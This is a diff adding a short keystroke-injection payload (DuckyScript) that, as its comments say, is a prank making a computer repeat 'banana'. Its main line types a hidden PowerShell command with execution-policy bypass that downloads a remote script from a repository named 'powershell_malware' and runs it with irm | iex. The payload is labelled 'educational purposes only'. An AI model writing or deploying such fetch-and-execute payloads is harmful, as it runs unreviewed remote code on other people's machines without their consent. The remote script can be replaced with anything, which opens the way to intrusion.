@@ -1,0 +1,11 @@
+REM Makes the computer say "banana" over and over again
+REM by Cayden Wright
+REM March 1, 2023
+REM Educational purposes only
+
+REM powershell tricks copied from I Am Jakoby
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass irm https://raw.githubusercontent.com/CWright2022/powershell_malware/main/speech_prank_continuous.ps1 | iex
+DELAY 500
+ENTER
